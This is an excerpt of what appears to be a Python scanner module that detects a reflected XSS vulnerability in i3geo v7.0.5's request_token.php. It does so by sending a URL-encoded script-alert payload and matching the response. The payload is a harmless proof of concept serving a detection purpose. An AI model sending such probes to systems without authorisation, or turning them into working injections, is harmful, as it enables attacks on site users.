...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'description': 'Portal do Software Publico Brasileiro i3geo v7.0.5 was discovered to contain a cross-site scripting (XSS) vulnerability via request_token.php.',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/i3geo/pacotes/linkedinoauth/example/request_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        ...
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                ...
                path='/i3geo/pacotes/linkedinoauth/example/request_token.php?=%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False
